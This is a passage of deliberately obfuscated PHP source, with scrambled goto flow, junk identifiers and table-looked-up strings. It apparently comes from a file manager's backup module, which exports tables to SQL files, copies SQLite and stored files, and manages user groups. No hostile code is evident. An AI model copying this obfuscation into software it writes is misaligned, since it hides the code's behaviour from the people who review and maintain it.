($eÑ¨”¢ ® as $c»İªŞïš˜) { $e¦‡êœùõÇ += Model($c»İªŞïš˜)->count(); } $C±òÃå°…‡ = new Task($CÕ‹ïçì‡[707], $CÕ‹ïçì‡[708], $e¦‡êœùõÇ, LNG($CÕ‹ïçì‡[709]) . $CÕ‹ïçì‡[710] . LNG($CÕ‹ïçì‡[711])); goto eğ‚âËğë; BŒ½²ïÚ¯: foreach ($eÑ¨”¢ ® as $c»İªŞïš˜) { $cÎµíà†ñ = "{$A…¤Ùô¬öõ}{$c»İªŞïš˜}\56\163\x71\x6c"; $C´È‡ Á += $this->makeSqlFile($c»İªŞïš˜, $cÎµíà†ñ, $C±òÃå°…‡, $A×»í®â—²); } $C±òÃå°…‡->end(); $aæ¨ö•‰í° = array($CÕ‹ïçì‡[704] => 1, $CÕ‹ïçì‡[716] => $C´È‡ Á); goto a£ÀÑ‡©âÓ; CïÅ­…ŠŸ: } public function makeSqlFile($Cµ—ÊÃî¡§, $f»®¥ÍŒ–Ù, $e’¡ÎíÖ, $B Á—°ì¬å) { goto CæßòóÈç™; DÖíŠå£Œã: $dà“öĞ×•Û = 2000; $B×ñ¥Î­Ù = fopen($f»®¥ÍŒ–Ù, $_SERVER[¿õñ][717]); $C ×È­‰¦Ó = Model($Cµ—ÊÃî¡§)->getPk(); goto f’ÊÅ•ƒ»; Bò÷ÄĞ å: return $d¦¿ƒŠà‡”; goto CÆÌÓ¥š¡; f’ÊÅ•ƒ»: $c—Ó“¨¢ì = Model($Cµ—ÊÃî¡§)->getDbFields(); do { $BÜŞë²¶† = Model($Cµ—ÊÃî¡§)->field($c—Ó“¨¢ì)->order($C ×È­‰¦Ó . $_SERVER[¿õñ][718])->selectPage($dà“öĞ×•Û, $aé…öìÈŸÑ); $f»»áßÌÉ’ = !empty($BÜŞë²¶†[$_SERVER[¿õñ][350]]) ? $BÜŞë²¶†[$_SERVER[¿õñ][350]] : array(); $F‚ŠÁŒ½…° = array(); foreach ($f»»áßÌÉ’ as $Bã™Œï–Œ) { if ($Cµ—ÊÃî¡§ == $_SERVER[¿õñ][719] && (!isset($B Á—°ì¬å[$_SERVER[¿õñ][689]]) || $B Á—°ì¬å[$_SERVER[¿õñ][689]] == $_SERVER[¿õñ][464])) { $Bã™Œï–Œ[$_SERVER[¿õñ][76]] = "\173\x69\x6f\x3a{$Fâ˜åãæ²‘}\175" . substr($Bã™Œï–Œ[$_SERVER[¿õñ][76]], strlen("\x7b\x69\157\72{$Bã™Œï–Œ[$_SERVER[¿õñ][720]]}\175")); $Bã™Œï–Œ[$_SERVER[¿õñ][720]] = $Fâ˜åãæ²‘; } $F‚ŠÁŒ½…°[] = $_SERVER[¿õñ][721] . $this->addSqlSlashes($Bã™Œï–Œ) . $_SERVER[¿õñ][722]; } if ($FŞƒõÏ‹Ö‘ = count($f»»áßÌÉ’)) { $E‘£Ï¶ÚÇ = "\111\116\123\105\122\124\x20\111\x4e\124\117\40\x60{$Cµ—ÊÃî¡§}\x60\x20\x28\x60" . implode($_SERVER[¿õñ][723], $c—Ó“¨¢ì) . $_SERVER[¿õñ][724]; fwrite($B×ñ¥Î­Ù, $E‘£Ï¶ÚÇ . implode($_SERVER[¿õñ][725], $F‚ŠÁŒ½…°) . $_SERVER[¿õñ][68] . PHP_EOL); $e’¡ÎíÖ->update($FŞƒõÏ‹Ö‘); } $aé…öìÈŸÑ++; $d¦¿ƒŠà‡” += $FŞƒõÏ‹Ö‘; } while ($FŞƒõÏ‹Ö‘ == $dà“öĞ×•Û); fclose($B×ñ¥Î­Ù); goto Bò÷ÄĞ å; CæßòóÈç™: $Fâ˜åãæ²‘ = self::$io; $d¦¿ƒŠà‡” = 0; $aé…öìÈŸÑ = 1; goto DÖíŠå£Œã; CÆÌÓ¥š¡: } private function addSqlSlashes($Eßõ‘ÒòšŠ) { $F–ÔÑæ¶º =& $_SERVER[¿õñ]; $eˆšÚØÕ = array(); foreach ($Eßõ‘ÒòšŠ as $Dµõô¾Ë‡´) { if (is_array($Dµõô¾Ë‡´)) { $Dµõô¾Ë‡´ = json_encode_force($Dµõô¾Ë‡´); } $Dµõô¾Ë‡´ = addslashes($Dµõô¾Ë‡´); $Dµõô¾Ë‡´ = str_replace(array($F–ÔÑæ¶º[726], $F–ÔÑæ¶º[214]), array($F–ÔÑæ¶º[727], $F–ÔÑæ¶º[728]), $Dµõô¾Ë‡´); $eˆšÚØÕ[] = $Dµõô¾Ë‡´; } return $F–ÔÑæ¶º[55] . implode($F–ÔÑæ¶º[729], $eˆšÚØÕ) . $F–ÔÑæ¶º[55]; } private function sqliteFile() { $fÛàÈñ‚ßƒ =& $_SERVER[¿õñ]; $Cˆ¶”Òøâ = null; $Fá·ÒÔ—õ„ = $GLOBALS[$fÛàÈñ‚ßƒ[6]][$fÛàÈñ‚ßƒ[17]]; if ($Fá·ÒÔ—õ„[$fÛàÈñ‚ßƒ[730]] == $fÛàÈñ‚ßƒ[731]) { $f©±§º¹ôÓ = explode($fÛàÈñ‚ßƒ[732], $Fá·ÒÔ—õ„[$fÛàÈñ‚ßƒ[733]]); if (substr($f©±§º¹ôÓ[0], 0, 6) == $fÛàÈñ‚ßƒ[9]) { $Cˆ¶”Òøâ = $f©±§º¹ôÓ[1]; } } else { if (substr($Fá·ÒÔ—õ„[$fÛàÈñ‚ßƒ[730]], 0, 6) == $fÛàÈñ‚ßƒ[9]) { $Cˆ¶”Òøâ = $Fá·ÒÔ—õ„[$fÛàÈñ‚ßƒ[231]]; } } return $Cˆ¶”Òøâ; } public function sqliteBackup($d®ù†Û§¥•) { goto FË‚»¤Õã; eÓ’¬É¬: return !1; goto eÇ’†¢×²; fš£‘ƒ‡¢: $f‰íÅ¡÷¹->task[$EÚÁÃò«İ[695]] = $eøè˜Ùáî·; IO::copy($féì…ìÀ« . $EÚÁÃò«İ[739], $d¿™¡øÎÓƒ); IO::copy($d®ù†Û§¥•, $d¿™¡øÎÓƒ); goto dË†–ĞÂŒ; Aáƒ×ªìİ¯: $E‡ºÌ§ÛÓƒ = array($EÚÁÃò«İ[712] => $EÚÁÃò«İ[9], $EÚÁÃò«İ[714] => 1, $EÚÁÃò«İ[736] => $eøè˜Ùáî·); Backup::set($E‡ºÌ§ÛÓƒ); $f‰íÅ¡÷¹ = new TaskFileTransfer($EÚÁÃò«İ[737], $EÚÁÃò«İ[708], 1, LNG($EÚÁÃò«İ[709]) . $EÚÁÃò«İ[408] . LNG($EÚÁÃò«İ[711]) . $EÚÁÃò«İ[738]); goto fš£‘ƒ‡¢; FË‚»¤Õã: $EÚÁÃò«İ =& $_SERVER[¿õñ]; $EÖî„”Ò— = self::$io; $féì…ìÀ« = CONTROLLER_DIR . $EÚÁÃò«İ[734]; goto Bî×ÎÙÛŒÑ; dË†–ĞÂŒ: $f‰íÅ¡÷¹->end(); $E‡ºÌ§ÛÓƒ = array($EÚÁÃò«İ[704] => 1, $EÚÁÃò«İ[716] => 1, $EÚÁÃò«İ[705] => 1, $EÚÁÃò«İ[740] => $eøè˜Ùáî·); Backup::set($E‡ºÌ§ÛÓƒ); goto eÓ’¬É¬; Bî×ÎÙÛŒÑ: $d¿™¡øÎÓƒ = "\173\x69\x6f\72{$EÖî„”Ò—}\x7d\x2f\144\141\164\141\142\x61\163\x65\x2f\142\141\143\x6b\165\160\x5f" . self::$name . $EÚÁÃò«İ[735]; if (!IO::exist($d¿™¡øÎÓƒ)) { IO::mkdir($d¿™¡øÎÓƒ); } $eøè˜Ùáî· = IO::size($d®ù†Û§¥•); goto Aáƒ×ªìİ¯; eÇ’†¢×²: } } class BackupDbFile { public function __construct() { } public function index() { goto EèÊ½Â…áÎ; D»Ô¯ Ôƒ‚: IO::copy($c¨°Û’å³, $eí¤‡Ñ§²Ò . "\142\x61\143\153\165\x70\x5f{$f˜¥Áì¥èè}\57"); $A¡¬ ñÛâ->end(); Backup::set(array($E»âò¥èàë[740] => $d´êµöäì¹[$E»âò¥èàë[78]])); goto e·ÏÒÁŸò…; e·ÏÒÁŸò…: return !0; goto aççÀŒ”æ; fØùŠåáÇ: Backup::set(array($E»âò¥èàë[736] => $d´êµöäì¹[$E»âò¥èàë[78]])); IO::move($aÍì¥Ó¿Ñ, $eí¤‡Ñ§²Ò); $c¨°Û’å³ = CONTROLLER_DIR . $E»âò¥èàë[741]; goto D»Ô¯ Ôƒ‚; EèÊ½Â…áÎ: $E»âò¥èàë =& $_SERVER[¿õñ]; $bğ›Ş˜«ß— = Backup::get(); $f˜¥Áì¥èè = $bğ›Ş˜«ß—[$E»âò¥èàë[28]]; goto CÈŒŞ¼¯; EÅ³†„ÖØÑ: $A¡¬ ñÛâ = new TaskFileTransfer($E»âò¥èàë[737], $E»âò¥èàë[708], 0, LNG($E»âò¥èàë[709]) . $E»âò¥èàë[408] . LNG($E»âò¥èàë[711]) . $E»âò¥èàë[738]); $A¡¬ ñÛâ->addPath($aÍì¥Ó¿Ñ); $d´êµöäì¹ = IO::infoWithChildren($aÍì¥Ó¿Ñ); goto fØùŠåáÇ; CÈŒŞ¼¯: $aÍì¥Ó¿Ñ = TEMP_FILES . "\142\x61\x63\153\x75\x70\x5f{$f˜¥Áì¥èè}\57"; $eí¤‡Ñ§²Ò = "\x7b\x69\x6f\72{$bğ›Ş˜«ß—[$E»âò¥èàë[688]]}\x7d\x2f\x64\x61\164\141\142\x61\x73\145\x2f"; IO::mkdir($eí¤‡Ñ§²Ò . "\142\141\x63\153\165\160\x5f{$f˜¥Áì¥èè}\57"); goto EÅ³†„ÖØÑ; aççÀŒ”æ: } } class BackupFile { public function __construct() { } public function index() { goto aÂõ¿ÜâÜŒ; aÂõ¿ÜâÜŒ: $aØº¹…‹ = Backup::get(); $f¼†°ˆ˜‡ = $aØº¹…‹[$_SERVER[¿õñ][278]][$_SERVER[¿õñ][164]][$_SERVER[¿õñ][415]]; $F„œ¢¸ºÅ  = array($_SERVER[¿õñ][416] => array($_SERVER[¿õñ][742], $f¼†°ˆ˜‡), $_SERVER[¿õñ][743] => array($_SERVER[¿õñ][316], $aØº¹…‹[$_SERVER[¿õñ][688]])); goto a¿½ó¸êİŒ; fëõíÆŠƒ™: $B‚ÃáÍÁ² = array(); $D¼ßÑëÚä = $FØ™”œÖÅ = 0; do { $EÓƒÉ‘—§´ = $_SERVER[¿õñ][748]; $eÜÔ‘‰ÍŸ = Model($_SERVER[¿õñ][719])->where($F„œ¢¸ºÅ )->field($EÓƒÉ‘—§´)->order($_SERVER[¿õñ][749])->selectPage($aÒ°Á••çÒ, $BÄ«·–Ää™); $E‰½„º·Ê = !empty($eÜÔ‘‰ÍŸ[$_SERVER[¿õñ][350]]) ? $eÜÔ‘‰ÍŸ[$_SERVER[¿õñ][350]] : array(); foreach ($E‰½„º·Ê as $A××‰åŒ£·) { goto E°ö—æ‚ù¡; E°ö—æ‚ù¡: if (!$this->_fileExist($A××‰åŒ£·, $B‚ÃáÍÁ²)) { $eÓÒÛê«Òµ -= 1; $eå¬³¡º£• -= (int) $A××‰åŒ£·[$_SERVER[¿õñ][78]]; write_log("\146\x69\x6c\x65\40\x6e\x6f\x74\40\x65\170\x69\163\164\56\x66\x69\154\x65\111\x44\x3a{$A××‰åŒ£·[$_SERVER[¿õñ][415]]}\54\x20\x70\141\x74\x68\x3a{$A××‰åŒ£·[$_SERVER[¿õñ][76]]}", $_SERVER[¿õñ][750]); continue; } $c÷•à‹œô¯ = $A××‰åŒ£·[$_SERVER[¿õñ][76]]; $aÚ†Ÿ™·ØĞ = "\x7b\x69\157\72{$aØº¹…‹[$_SERVER[¿õñ][688]]}\175" . substr($c÷•à‹œô¯, strlen("\x7b\151\x6f\x3a{$A××‰åŒ£·[$_SERVER[¿õñ][720]]}\175")); goto b‡“ëÄ¢Š; b‡“ëÄ¢Š: if (IO::exist($aÚ†Ÿ™·ØĞ)) { $e¹Ü¹á²¹¿->updateFileEnd($A××‰åŒ£·[$_SERVER[¿õñ][28]], $A××‰åŒ£·[$_SERVER[¿õñ][78]]); } else { $aÚ†Ÿ™·ØĞ = get_path_father($aÚ†Ÿ™·ØĞ); $Bª•í‰÷¦˜ = IO::mkdir($aÚ†Ÿ™·ØĞ); if (!$Bª•í‰÷¦˜ || !IO::copy($c÷•à‹œô¯, $aÚ†Ÿ™·ØĞ, $_SERVER[¿õñ][751])) { write_log($_SERVER[¿õñ][752] . $c÷•à‹œô¯ . $_SERVER[¿õñ][753] . $aÚ†Ÿ™·ØĞ . $_SERVER[¿õñ][468], $_SERVER[¿õñ][708]); continue; } } $f¼†°ˆ˜‡ = $A××‰åŒ£·[$_SERVER[¿õñ][415]]; $F¤ŸùØíğë += 1; goto EÉ­éìğñ­; aÑ† È´ÌÒ: if ($D­¾‡ˆµÔå >= 1024 * 1024 * 50) { $CÜ¿‚î³­ = array($_SERVER[¿õñ][754] => $f¼†°ˆ˜‡, $_SERVER[¿õñ][755] => $FØ™”œÖÅ, $_SERVER[¿õñ][756] => $D¼ßÑëÚä); Backup::set($CÜ¿‚î³­); $D­¾‡ˆµÔå = $F¤ŸùØíğë = 0; } goto E¬¶İÓËÇ; EÉ­éìğñ­: $D­¾‡ˆµÔå += $A××‰åŒ£·[$_SERVER[¿õñ][78]]; $FØ™”œÖÅ += 1; $D¼ßÑëÚä += $A××‰åŒ£·[$_SERVER[¿õñ][78]]; goto aÑ† È´ÌÒ; E¬¶İÓËÇ: } $dî›‹ÇŠ‡ = count($E‰½„º·Ê); $BÄ«·–Ää™++; } while ($dî›‹ÇŠ‡ == $aÒ°Á••çÒ); goto B‡£±ğÓîŠ; B‡£±ğÓîŠ: $e¹Ü¹á²¹¿->end(); $CÜ¿‚î³­ = array($_SERVER[¿õñ][757] => 1, $_SERVER[¿õñ][700] => time(), $_SERVER[¿õñ][706] => 1, $_SERVER[¿õñ][754] => $f¼†°ˆ˜‡, $_SERVER[¿õñ][747] => $eå¬³¡º£•, $_SERVER[¿õñ][746] => $eÓÒÛê«Òµ); if ($F¤ŸùØíğë) { $CÜ¿‚î³­[$_SERVER[¿õñ][755]] = $FØ™”œÖÅ; $CÜ¿‚î³­[$_SERVER[¿õñ][756]] = $D¼ßÑëÚä; } goto c”äÚâáÙÎ; fêÜÙÓ¦Á : $e¹Ü¹á²¹¿->task[$_SERVER[¿õñ][695]] = $eå¬³¡º£•; $CÜ¿‚î³­ = array($_SERVER[¿õñ][746] => $eÓÒÛê«Òµ, $_SERVER[¿õñ][747] => $eå¬³¡º£•); Backup::set($CÜ¿‚î³­); goto dË£êØâØµ; a¿½ó¸êİŒ: $eÓÒÛê«Òµ = (int) Model($_SERVER[¿õñ][719])->where($F„œ¢¸ºÅ )->count($_SERVER[¿õñ][415]); $eå¬³¡º£• = (int) Model($_SERVER[¿õñ][719])->where($F„œ¢¸ºÅ )->sum($_SERVER[¿õñ][78]); $e¹Ü¹á²¹¿ = new TaskFileTransfer($_SERVER[¿õñ][744], $_SERVER[¿õñ][708], $eÓÒÛê«Òµ, LNG($_SERVER[¿õñ][709]) . $_SERVER[¿õñ][710] . LNG($_SERVER[¿õñ][745])); goto fêÜÙÓ¦Á ; c”äÚâáÙÎ: Backup::set($CÜ¿‚î³­); $this->_fileFilter($B‚ÃáÍÁ²); return !0; goto f¶ÏØÇ®é®; dË£êØâØµ: $BÄ«·–Ää™ = 1; $aÒ°Á••çÒ = 1000; $D­¾‡ˆµÔå = $F¤ŸùØíğë = 0; goto fëõíÆŠƒ™; f¶ÏØÇ®é®: } private function _fileExist($cíÎƒÄÄÈ‡, &$c¬ÏÙâ£ãÚ) { goto Fæ­çèÖœ; fî âÖĞ‚: $CßÈÁÌéÙ = array($eâŒ±ìÆÓÛ[720] => $cíÎƒÄÄÈ‡[$eâŒ±ìÆÓÛ[720]], $eâŒ±ìÆÓÛ[76] => array($eâŒ±ìÆÓÛ[758], "{$f«ˆ°ê…Ö}\x25")); $b’³Î—÷É— = Model($eâŒ±ìÆÓÛ[719])->where($CßÈÁÌéÙ)->field($eâŒ±ìÆÓÛ[416])->select(); $c¬ÏÙâ£ãÚ = array_merge($c¬ÏÙâ£ãÚ, array_to_keyvalue($b’³Î—÷É—, $eâŒ±ìÆÓÛ[33], $eâŒ±ìÆÓÛ[415])); goto D½Ãùöåö; D½Ãùöåö: return !1; goto Aºï¦Èøä; Fæ­çèÖœ: $eâŒ±ìÆÓÛ =& $_SERVER[¿õñ]; $D¤¼®ÓŞ = $cíÎƒÄÄÈ‡[$eâŒ±ìÆÓÛ[76]]; if (in_array($cíÎƒÄÄÈ‡[$eâŒ±ìÆÓÛ[415]], $c¬ÏÙâ£ãÚ)) { return !1; } goto CèŠ¥ÔŒà”; CèŠ¥ÔŒà”: if (IO::exist($D¤¼®ÓŞ)) { return !0; } $f«ˆ°ê…Ö = get_path_father($D¤¼®ÓŞ); if (IO::exist($f«ˆ°ê…Ö)) { $c¬ÏÙâ£ãÚ[] = $cíÎƒÄÄÈ‡[$eâŒ±ìÆÓÛ[415]]; return !1; } goto fî âÖĞ‚; Aºï¦Èøä: } private function _fileFilter($a×ºô©˜¶î) { $DÚ˜§ÒŸ“ê =& $_SERVER[¿õñ]; if (empty($a×ºô©˜¶î)) { return; } $FãŞ´¬¨Ç™ = array($DÚ˜§ÒŸ“ê[415] => array($DÚ˜§ÒŸ“ê[7], array_unique($a×ºô©˜¶î))); $Aİ™ÆÃİö = Model($DÚ˜§ÒŸ“ê[759])->where($FãŞ´¬¨Ç™)->field($DÚ˜§ÒŸ“ê[366])->select(); foreach ($Aİ™ÆÃİö as $Fé»½‡) { Model($DÚ˜§ÒŸ“ê[759])->remove($Fé»½‡[$DÚ˜§ÒŸ“ê[366]], !1); } } } goto AƒÏ÷§„à§; F”±é£«£: class GroupModel extends ModelBase { protected $tableName = "\147\x72\x6f\x75\x70"; protected $tableMeta = array("\164\141\x62\x6c\x65\x4e\141\x6d\x65" => "\x67\162\157\x75\160\x5f\155\145\x74\141", "\x6d\145\x74\141\x46\151\x65\x6c\144" => "\147\162\x6f\165\x70\x49\x44"); protected function cacheFunctionAlias($ešÑÔêÌŠÖ) { $f•˜Ìó²‹Ô =& $_SERVER[¿õñ]; return array($f•˜Ìó²‹Ô[2081] => array($ešÑÔêÌŠÖ[0], $f•˜Ìó²‹Ô[2082]), $f•˜Ìó²‹Ô[2083] => array($ešÑÔêÌŠÖ[0], $f•˜Ìó²‹Ô[2082])); } protected function getInfo($cŠèìãŒ°) { $aÂËˆÆĞŒÌ = $this->getInfoSimple($cŠèìãŒ°); if (!$aÂËˆÆĞŒÌ) { return !1; } return $this->_listDataApplyItem($aÂËˆÆĞŒÌ); } protected function getInfoSimple($b†¿–™·­Ã, $DÄÑ„¦•Ä = false) { $d·ª¼ÍŠªî =& $_SERVER[¿õñ]; if ($DÄÑ„¦•Ä) { $bÏ¥øÂ„‹‘ = array($d·ª¼ÍŠªî[2013] => intval($b†¿–™·­Ã)); return $this->where($bÏ¥øÂ„‹‘)->find(); } return $this->cacheFunctionGet($d·ª¼ÍŠªî[2084], $b†¿–™·­Ã); } protected function groupAdd($Aù±ÍÙåÓ) { goto Fåô»ø÷ö©; F­¿¥æÅñƒ: return $Dšï ˆ¥¢; goto dÆĞÎÚğÏ©; FõÌ‘ªÏÇ‡: if ($DëÌæï¶‹¢[$c†óÛ¶„è¨[455]]) { $d×İßÒíŒ = $DëÌæï¶‹¢[$c†óÛ¶„è¨[455]] . $DëÌæï¶‹¢[$c†óÛ¶„è¨[2013]] . $c†óÛ¶„è¨[47]; } $bóÉìØô è = array($c†óÛ¶„è¨[383] => $this->groupNameAuto($Aù±ÍÙåÓ[$c†óÛ¶„è¨[457]], $Aù±ÍÙåÓ[$c†óÛ¶„è¨[28]]), $c†óÛ¶„è¨[365] => $Aù±ÍÙåÓ[$c†óÛ¶„è¨[457]], $c†óÛ¶„è¨[518] => $d×İßÒíŒ, $c†óÛ¶„è¨[2086] => $Aù±ÍÙåÓ[$c†óÛ¶„è¨[1997]], $c†óÛ¶„è¨[2087] => 0, $c†óÛ¶„è¨[2017] => 0); if (!empty($Aù±ÍÙåÓ[$c†óÛ¶„è¨[2013]])) { $bóÉìØô è[$c†óÛ¶„è¨[2013]] = $Aù±ÍÙåÓ[$c†óÛ¶„è¨[2013]]; } goto E…ï£ÕÖ°; E…ï£ÕÖ°: $Dšï ˆ¥¢ = $this->add($bóÉìØô è); $this->setNamePinyin($Dšï ˆ¥¢, $bóÉìØô è[$c†óÛ¶„è¨[28]]); Model($c†óÛ¶„è¨[1087])->groupRootAdd($Dšï ˆ¥¢); goto F­¿¥æÅñƒ; Fåô»ø÷ö©: $c†óÛ¶„è¨ =& $_SERVER[¿õñ]; if (!$Aù±ÍÙåÓ[$c†óÛ¶„è¨[457]] && isset($Aù±ÍÙåÓ[$c†óÛ¶„è¨[2013]]) && $Aù±ÍÙåÓ[$c†óÛ¶„è¨[2013]] == 1) { if ($DëÌæï¶‹¢ = $this->getInfoSimple($Aù±ÍÙåÓ[$c†óÛ¶„è¨[2013]], !0)) { return $Aù±ÍÙåÓ[$c†óÛ¶„è¨[2013]]; } } else { $DëÌæï¶‹¢ = $this->getInfoSimple($Aù±ÍÙåÓ[$c†óÛ¶„è¨[457]]); if (!$DëÌæï¶‹¢) { return !1; } } $d×İßÒíŒ = $c†óÛ¶„è¨[2085]; goto FõÌ‘ªÏÇ‡; dÆĞÎÚğÏ©: } protected function groupEdit($bš›åöŒˆº, $aß§•ì”°™) { $b—…†Æ¶­ =& $_SERVER[¿õñ]; if (!empty($aß§•ì”°™[$b—…†Æ¶­[457]])) { $AŒÈ®½¯Èë = $this->getInfoSimple($bš›åöŒˆº); $f’É®Áµ„Ä = $this->getInfoSimple($aß§•ì”°™[$b—…†Æ¶­[457]]); if (!$AŒÈ®½¯Èë || !$f’É®Áµ„Ä) { return !1; } if ($aß§•ì”°™[$b—…†Æ¶­[457]] != $AŒÈ®½¯Èë[$b—…†Æ¶­[457]]) { if ($f’É®Áµ„Ä[$b—…†Æ¶­[455]] !== $AŒÈ®½¯Èë[$b—…†Æ¶­[455]] && strpos($f’É®Áµ„Ä[$b—…†Æ¶­[455]], $AŒÈ®½¯Èë[$b—…†Æ¶­[455]]) === 0) { return !1; } $aß§•ì”°™[$b—…†Æ¶­[518]] = $f’É®Áµ„Ä[$b—…†Æ¶­[455]] . $aß§•ì”°™[$b—…†Æ¶­[457]] . $b—…†Æ¶­[47]; $this->_changeChildLevel($AŒÈ®½¯Èë, $f’É®Áµ„Ä); } } if (isset($aß§•ì”°™[$b—…†Æ¶­[28]])) { $this->setNamePinyin($bš›åöŒˆº, $aß§•ì”°™[$b—…†Æ¶­[28]]); } return $this->where(array($b—…†Æ¶­[2088] => $bš›åöŒˆº))->save($aß§•ì”°™); } private function _changeChildLevel($e–ß«‰ óí, $A“‚¤ôÑ˜, $fÖ®öÖâ—ö = false) { goto aÎ¹«ÔïêÌ; cï¡ê·¯×à: if ($fÖ®öÖâ—ö) { $f—Ö‰ô¯ã = $A“‚¤ôÑ˜[$fº£†äéàÁ[455]] . $A“‚¤ôÑ˜[$fº£†äéàÁ[2013]] . $fº£†äéàÁ[47]; } $f¡ê›ÑÊÔ± = array($fº£†äéàÁ[518] => array($fº£†äéàÁ[475], $e–ß«‰ óí[$fº£†äéàÁ[455]] . $e–ß«‰ óí[$fº£†äéàÁ[2013]] . $fº£†äéàÁ[476])); $FÆ„¡±‘ºµ = array($fº£†äéàÁ[518] => array($fº£†äéàÁ[526], "\x72\x65\160\x6c\x61\x63\145\x28\160\x61\162\x65\156\x74\x4c\145\166\x65\154\54\47{$f’ ©²¶Ç‹}\47\54\x27{$f—Ö‰ô¯ã}\47\51")); goto C“«¼Ù ëˆ; aÎ¹«ÔïêÌ: $fº£†äéàÁ =& $_SERVER[¿õñ]; $f’ ©²¶Ç‹ = $e–ß«‰ óí[$fº£†äéàÁ[455]] . $e–ß«‰ óí[$fº£†äéàÁ[2013]] . $fº£†äéàÁ[47]; $f—Ö‰ô¯ã = $A“‚¤ôÑ˜[$fº£†äéàÁ[455]] . $A“‚¤ôÑ˜[$fº£†äéàÁ[2013]] . $fº£†äéàÁ[47] . $e–ß«‰ óí[$fº£†äéàÁ[2013]] . $fº£†äéàÁ[47]; goto cï¡ê·¯×à; C“«¼Ù ëˆ: $this->where($f¡ê›ÑÊÔ±)->data($FÆ„¡±‘ºµ)->save(); goto dŠ‡Ëôğò; dŠ‡Ëôğò: } public function setNamePinyin($eì¦ğÌ†­£, $A¯¼µî¸Ê = false) { $E·Òè¢ =& $_SERVER[¿õñ]; if (!$A¯¼µî¸Ê) { $AÊ´ø×‡¾¨ = $this->getInfoSimple($eì¦ğÌ†­£); $A¯¼µî¸Ê = $AÊ´ø×‡¾¨[$E·Òè¢[28]]; } if (!Input::check($A¯¼µî¸Ê, $E·Òè¢[520])) { $this->metaSet($eì¦ğÌ†­£, $E·Òè¢[412], null); $this->metaSet($eì¦ğÌ†­£, $E·Òè¢[411], null); return; } $c…ÇÖ¬Ü± = array($E·Òè¢[412] => str_replace($E·Òè¢[50], $E·Òè¢[33], Pinyin::encode($A¯¼µî¸Ê)), $E·Òè¢[411] => Pinyin::encode($A¯¼µî¸Ê, $E·Òè¢[521])); $this->metaSet($eì¦ğÌ†­£, $c…ÇÖ¬Ü±); } protected function groupRemove($Fâñ„®òä) { goto Eõ„Î¡è; CÄ˜×•³ô£: $this->where(array($fîØÎÛß©[457] => $Fâñ„®òä))->save(array($fîØÎÛß©[457] => $Fì¦Œ’µåÒ[$fîØÎÛß©[457]])); Model($fîØÎÛß©[2089])->where($f³ä¼åº‰)->delete(); Model($fîØÎÛß©[2090])->where($f³ä¼åº‰)->delete(); goto E‰Ó‰•‚ ‚; Eõ„Î¡è: $fîØÎÛß© =& $_SERVER[¿õñ]; $f³ä¼åº‰ = array($fîØÎÛß©[2013] => $Fâñ„®òä); $Fì¦Œ’µåÒ = $this->where($f³ä¼åº‰)->find(); goto eÊã¸îÉŒİ; E‰Ó‰•‚ ‚: Model($fîØÎÛß©[759])->groupRootRemove($Fâñ„®òä); return $this->where($f³ä¼åº‰)->delete(); goto A°ŠÂÁğÒê; eÊã¸îÉŒİ: if (!$Fì¦Œ’µåÒ || $Fì¦Œ’µåÒ[$fîØÎÛß©[457]] == 0) { return !1; } $c‘ßÜ¸ñö = $this->getInfoSimple($Fì¦Œ’µåÒ[$fîØÎÛß©[457]]); $this->_changeChildLevel($Fì¦Œ’µåÒ, $c‘ßÜ¸ñö, !0); goto CÄ˜×•³ô£; A°ŠÂÁğÒê: } public function listData() { $E‹ßŒèî¶ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($E‹ßŒèî¶[$_SERVER[¿õñ][350]]); return $E‹ßŒèî¶; } private function _makeOrder($FÅ–Å‚ñó = '') { goto F‡­ªˆ¾¨Ò; F‡­ªˆ¾¨Ò: $B¦§ÕØî˜ª =& $_SERVER[¿õñ]; $e¬Ÿ¸°‘ß = array($B¦§ÕØî˜ª[2013], $B¦§ÕØî˜ª[28], $B¦§ÕØî˜ª[1999], $B¦§ÕØî˜ª[184]); $AÔ–»ÒÆàÚ = array($B¦§ÕØî˜ª[398] => $B¦§ÕØî˜ª[399], $B¦§ÕØî˜ª[400] => $B¦§ÕØî˜ª[401]); goto d÷¼Ì¼òµ¶; eŒ¹Ò×ô×: $FÅ–Å‚ñó = $FÅ–Å‚ñó . "{$a‹÷Éë­ŞÒ}\x20{$cÛ‚ª¸}\x2c\40\x67\x72\x6f\x75\x70\111\104\40\141\x73\x63"; return $this->order($FÅ–Å‚ñó); goto fÌ‘³›†ğà; d÷¼Ì¼òµ¶: $a‹÷Éë­ŞÒ = Input::get($B¦§ÕØî˜ª[403], $B¦§ÕØî˜ª[7], $B¦§ÕØî˜ª[2088], $e¬Ÿ¸°‘ß); $cÛ‚ª¸ = Input::get($B¦§ÕØî˜ª[404], $B¦§ÕØî˜ª[7], $B¦§ÕØî˜ª[2091], array($B¦§ÕØî˜ª[2091], $B¦§ÕØî˜ª[400])); $cÛ‚ª¸ = $AÔ–»ÒÆàÚ[$cÛ‚ª¸]; goto eŒ¹Ò×ô×; fÌ‘³›†ğà: } public function listChild($Dß¾Ûª˜™Û) { $d¿Á±‹ìæÛ =& $_SERVER[¿õñ]; $aˆ„Ç³—‘Ö = $this->where(array($d¿Á±‹ìæÛ[457] => $Dß¾Ûª˜™Û))->_makeOrder()->selectPage(200); $this->_listDataApply($aˆ„Ç³—‘Ö[$d¿Á±‹ìæÛ[350]]); return $aˆ„Ç³—‘Ö; } public function listByID($DÄ¥×ËØœ¢) { $f½È•£›ê” =& $_SERVER[¿õñ]; if (!$DÄ¥×ËØœ¢) { return array(); } $d™Ç˜£†¨ñ = array($f½È•£›ê”[2013] => array($f½È•£›ê”[7], $DÄ¥×ËØœ¢)); $e¬÷ŠÙ…¬ = $this->where($d™Ç˜£†¨ñ)->select(); $this->_listDataApply($e¬÷ŠÙ…¬); return $e¬÷ŠÙ…¬; } public function listSearch($c ³Èµ‡Åã) { goto Eƒãí”•ÈŞ; B¸³¶¶ÀÆ…: $this->_listDataApply($eÒÀ‹½š‹[$Eˆ‡ßè Î[350]]); return $eÒÀ‹½š‹; goto d‹Ê„ñ„—Å; B¡°ÆÜˆù´: if (!trim($f¸î„æ¸½ˆ)) { return !1; } $f¸î„æ¸½ˆ = str_replace($Eˆ‡ßè Î[2094], $Eˆ‡ßè Î[2095], $f¸î„æ¸½ˆ); $dÇÕÎ™¿Ò„ = array($Eˆ‡ßè Î[2013] => array($Eˆ‡ßè Î[758], "\45{$f¸î„æ¸½ˆ}\45"), $Eˆ‡ßè Î[28] => array($Eˆ‡ßè Î[758], "\45{$f¸î„æ¸½ˆ}\x25"), 